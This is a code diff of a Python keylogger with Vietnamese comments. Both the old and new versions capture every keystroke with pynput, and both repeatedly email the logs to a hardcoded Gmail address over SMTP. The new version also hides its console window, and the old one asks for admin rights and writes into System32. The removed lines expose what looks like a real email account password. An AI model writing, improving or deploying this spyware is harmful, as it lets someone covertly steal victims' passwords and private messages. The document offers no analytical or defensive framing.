@@ -1,118 +1,153 @@
-import os
-import sys
 import logging
-import time
-import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
 from pynput.keyboard import Listener, Key
-import ctypes
+import os
+import threading
+import zipfile
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email.mime.text import MIMEText
+from email import encoders
+import smtplib
+import codecs
 
-# Kiểm tra nếu chương trình đang chạy với quyền Administrator
+# Cấu hình
+LOG_DIR = os.path.join(os.getenv("TEMP", "/tmp"), "keylogger_logs")
+LOG_FILE = os.path.join(LOG_DIR, "keylog.txt")
+ZIP_FILE = os.path.join(LOG_DIR, "keylog.zip")
+EMAIL_INTERVAL = 20
+EMAIL_ADDRESS = "Youremail@gmail.com"
+EMAIL_PASSWORD = "password"
+TO_EMAIL = "nghia0843309947@gmail.com"
+SMTP_SERVER = "smtp.gmail.com"
+SMTP_PORT = 587
+
+# Thiết lập thư mục log
+if not os.path.exists(LOG_DIR):
+    os.makedirs(LOG_DIR)
+
+# Thiết lập logging
+logging.basicConfig(
+    filename=LOG_FILE,
+    level=logging.DEBUG,
+    format="%(asctime)s - %(message)s",
+    datefmt="%Y-%m-%d %H:%M:%S"
+)
+
+# Hàm đọc nội dung file log
 
 
-def is_admin():
+def read_log_file():
     try:
-        return ctypes.windll.shell32.IsUserAnAdmin() != 0
-    except:
-        return False
-
-
-# Nếu chưa có quyền Administrator, yêu cầu chạy lại chương trình với quyền Admin
-if not is_admin():
-    script = sys.argv[0]
-    ctypes.windll.shell32.ShellExecuteW(
-        None, "runas", sys.executable, script, None, 1)
-    sys.exit()
-
-# Đảm bảo quyền ghi vào thư mục System32
-system32_path = os.path.join(os.environ['WINDIR'], 'System32')
-if not os.access(system32_path, os.W_OK):
-    print("Bạn cần quyền Administrator để ghi vào System32.")
-    sys.exit()
-
-# Thiết lập file log trong thư mục System32
-log_file_path = os.path.join(system32_path, "keylog.txt")
-logging.basicConfig(filename=log_file_path, level=logging.DEBUG,
-                    format="%(asctime)s - %(message)s")
-
-# Cấu hình gửi email
-
-
-def send_email():
-    from_email = "nghia01695@gmail.com"  # Địa chỉ email của bạn
-    to_email = "nghia0843309947@gmail.com"  # Địa chỉ email người nhận
-    password = "@Ducnghia1207"  # Sử dụng mật khẩu ứng dụng nếu bật 2FA
-
-    # Tạo đối tượng email
-    msg = MIMEMultipart()
-    msg['From'] = from_email
-    msg['To'] = to_email
-    msg['Subject'] = "Keylog Report"
-
-    # Nội dung email
-    body = "Đây là báo cáo keylog."
-    msg.attach(MIMEText(body, 'plain'))
-
-    # Đính kèm file log
-    attachment = open(log_file_path, "rb")
-    part = MIMEBase('application', 'octet-stream')
-    part.set_payload(attachment.read())
-    encoders.encode_base64(part)
-    part.add_header('Content-Disposition', "attachment; filename= keylog.txt")
-    msg.attach(part)
-
-    # Kết nối với Gmail SMTP server và gửi email
-    try:
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        server.login(from_email, password)
-        text = msg.as_string()
-        server.sendmail(from_email, to_email, text)
-        server.quit()
-        print("Email đã được gửi.")
+        with open(LOG_FILE, 'r') as log_file:
+            return log_file.read()
     except Exception as e:
-        print(f"Lỗi khi gửi email: {e}")
+        logging.error(f"Failed to read log file: {e}")
+        return ""
 
-# Hàm khi một phím được nhấn
+# Hàm xử lý phím bấm
 
 
 def on_press(key):
     try:
-        logging.info('Phím nhấn: {0}'.format(key.char))
+        if key.char == " ":
+            with open(LOG_FILE, "a") as log_file:
+                log_file.write(" \n")
+        else:
+            with open(LOG_FILE, "a") as log_file:
+                log_file.write(key.char)
     except AttributeError:
-        logging.info('Phím đặc biệt: {0}'.format(key))
+        special_keys = {
+            Key.enter: "\n",
+            Key.space: " ",
+            Key.tab: "\t"
+        }
+        if key in special_keys:
+            with open(LOG_FILE, "a") as log_file:
+                log_file.write(special_keys[key])
+        else:
+            with open(LOG_FILE, "a") as log_file:
+                log_file.write(f"[{key.name}]")
 
-# Hàm khi một phím được thả
+# Hàm xử lý phím nhả
 
 
 def on_release(key):
-    if key == Key.esc:
-        print("Keylogger đã dừng.")
+    if key == Key.ctrl and Key.tab:
+        logging.info("Keylogger stopped.")
         return False
 
-# Lắng nghe sự kiện bàn phím
+# Hàm xóa nội dung file log và tạo file mới
 
 
-def start_keylogger():
+def clear_log_file():
+    try:
+        # Xóa nội dung file log
+        open(LOG_FILE, 'w').close()
+        logging.info("Log file cleared and a new log file created.")
+    except Exception as e:
+        logging.error(f"Failed to clear log file: {e}")
+
+# Nén file log
+
+
+def compress_logs():
+    with zipfile.ZipFile(ZIP_FILE, 'w') as zipf:
+        zipf.write(LOG_FILE, arcname=os.path.basename(LOG_FILE))
+
+# Gửi email với nội dung file log
+
+
+def send_email_with_log_content():
+    while True:
+        try:
+            log_content = read_log_file()
+            if log_content:  # Nếu có nội dung trong log file
+                msg = MIMEMultipart()
+                msg['From'] = EMAIL_ADDRESS
+                msg['To'] = TO_EMAIL
+                msg['Subject'] = "Keylogger Logs Content"
+
+                # Thêm nội dung log vào email body
+                msg.attach(MIMEText(log_content, 'plain'))
+
+                # Gửi email
+                server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
+                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+                server.sendmail(EMAIL_ADDRESS, TO_EMAIL, msg.as_string())
+                server.quit()
+
+                logging.info("Logs sent via email.")
+
+                # Xóa nội dung file log và tạo file mới
+                clear_log_file()
+            else:
+                logging.warning("Log file is empty.")
+        except Exception as e:
+            logging.error(f"Failed to send email with log content: {e}")
+
+        threading.Event().wait(EMAIL_INTERVAL)
+
+# Chạy keylogger
+
+
+def run_keylogger():
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
-# Chạy keylogger và gửi email mỗi 10 giây
+# Ẩn cửa sổ trên Windows
 
 
-def main():
-    # Chạy keylogger trong một luồng riêng
-    import threading
-    threading.Thread(target=start_keylogger).start()
-
-    # Gửi email mỗi 10 giây
-    while True:
-        time.sleep(360)  # Đợi 10 giây
-        send_email()  # Gửi email với file log
+def hide_window():
+    try:
+        import ctypes
+        ctypes.windll.user32.ShowWindow(
+            ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    except Exception:
+        pass
 
 
+# Khởi chạy chương trình
 if __name__ == "__main__":
-    main()
+    hide_window()
+    threading.Thread(target=send_email_with_log_content, daemon=True).start()
+    run_keylogger()
